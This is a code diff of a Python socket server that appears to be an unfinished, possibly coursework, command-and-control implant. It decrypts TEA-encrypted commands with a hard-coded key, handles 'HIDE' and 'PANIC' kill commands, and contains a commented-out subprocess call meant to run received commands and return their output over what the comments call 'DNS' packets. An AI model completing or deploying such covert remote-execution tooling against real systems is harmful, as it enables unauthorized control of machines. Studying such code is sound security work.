@@ -13,38 +13,138 @@ def runServer():
     conn, addr = s.accept() 
     print("New connection made from: " + str(addr))
     while True:
-        #receive client data
-        data = conn.recv(PKT_SIZE).decode()
-        if not data:
+        ##receive client data
+        recv_data = conn.recv(PKT_SIZE).decode()
+        if not recv_data:
             # if data is not received break
             break
-        #connect
-        print("client said:" + str(data))
 
-        #get input
-        user_input = input('> ')
-        safe_input = processInput(user_input)
-        if(safe_input == None):
-            print("input was too long")
-            safe_input = "lenerror" + (' ' * 8)
+        ##unpack data - SHOULD NEVER ERROR
+        recv_msg, err = unpackData(recv_data)
+        
+        #DEBUGGING: print the message
+        print("client said:" + str(recv_msg))
 
-        #encrypt input
-        encrypted_user_input = encrypt(safe_input,KEY)
-        
-        #create "DNS" packet
-        #...
-        #...
-        packet = encrypted_user_input
-        
-        #send data
+        ##extract the command
+        cmd = recv_msg.strip().split(" ",1)
+
+        ##handle special commands
+        if (cmd[0] == "HIDE"):
+            #Execute a hide
+            exit(0)
+        elif (cmd[0] == "PANIC"):
+            #clean up
+            exit(0)
+
+        ##try to execute the command
+        '''
+        cmd_output = ""
+        try:
+            rawout = subprocess.run(cmd, capture_output=True)
+        except Exception as e:
+            print('Error executing command... ignoring')
+            return_msg = "command failed"
+            continue
+        else:
+            cmd_output = "EXECUTED COMMAND\n" + str(rawout.stdout,'utf-8')
+            pass
+        finally:
+            pass
+        '''
+
+        ##craft return packet with cmd_output
+        #packet = cmd_output
+        packet, err = packInput("helloworld")
+        if(err != 0):
+            print("Hmmm...")
+
+        #send return packet data
         conn.send(packet.encode())
-        #conn.send(data.encode())  # send data to the client
+
 
     conn.close()  # close the connection
 
-###
-#Helper functions
-###
+#########################
+#  Helper functions  #
+######################
+
+#def packInput(user_input)
+#args: user_input - user provided command string
+#returns: (packet, err) - DNS packet and error message
+#   err = 0 ; no error
+#       = 1 ; user_input length error
+#       = 2 ; encryption error
+#       = 3 ; decryption error
+#       = 4 ; packet crafting error
+def packInput(user_input):
+    TEA_KEY = "zMWYCRLd4szoBiPP"
+    packet = None
+    err = 0
+
+    ##user input sanitation
+    safe_input = processInput(user_input)
+    if(safe_input == None):
+        err = 1
+        return packet, err
+    
+    ##encryption
+    encrypted_safe_input = ""
+    try:
+        encrypted_safe_input = encrypt(safe_input, TEA_KEY)
+    except Exception as e:
+        err = 2
+        return packet, err
+    finally:
+        pass
+    
+    ##decryption test
+    try:
+        decrypt(encrypted_safe_input, TEA_KEY)
+    except Exception as e:
+        err = 2
+        return packet, err
+    finally:
+        pass
+
+    ##craft packet
+    packet = encrypted_safe_input
+
+    #return packet
+    return packet, err
+
+#def unpackData(recv_data)
+#args: recv_data - packet recieved from server
+#returns: (recv_msg, err) - extracted plaintext message and error message
+#   err = 0 ; no error
+#       = 1 ; unpacking error
+#       = 2 ; decryption error
+def unpackData(recv_data):
+    TEA_KEY = "zMWYCRLd4szoBiPP"
+    recv_msg = None
+    err = 0
+
+    ##extract message packet
+    encrypted_recv_msg = recv_data
+
+    ##decrypt message
+    try:
+        recv_msg = decrypt(encrypted_recv_msg, TEA_KEY)
+    except Exception as e:
+        err = 2
+        return recv_msg, err
+    finally:
+        pass
+
+    ##strip white space sanitation
+    recv_msg = recv_msg.strip()    
+
+    ##return message
+    return recv_msg, err
+
+#def processInput(user_input)
+#args: user_input - raw input captured from cli
+#returns: None if user_input is too long (>512 bytes)
+#otherwise, user_input padded to a certain length with whitespace. 
 def processInput(uinput):
     len_input = len(uinput)
     if(len_input <= 64):
@@ -61,9 +161,9 @@ def processInput(uinput):
     return None
     
 
-###
-#TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5
-###
+#######################################################################################
+# TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5 #
+#######################################################################################
 def encrypt(plaintext, key):
     if not plaintext:
         return ''
